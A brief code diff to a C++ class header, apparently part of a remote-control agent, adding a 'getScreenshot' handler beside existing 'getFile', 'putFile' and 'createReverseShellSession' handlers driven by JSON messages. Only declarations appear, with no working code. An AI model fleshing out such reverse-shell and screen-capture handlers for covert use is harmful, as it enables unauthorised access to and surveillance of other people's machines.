@@ -14,4 +14,5 @@ public:
 	static void getFile(nlohmann::json message);
 	static void putFile(nlohmann::json message);
 	static void createReverseShellSession(nlohmann::json message);
+	static void getScreenshot(nlohmann::json message);
 };
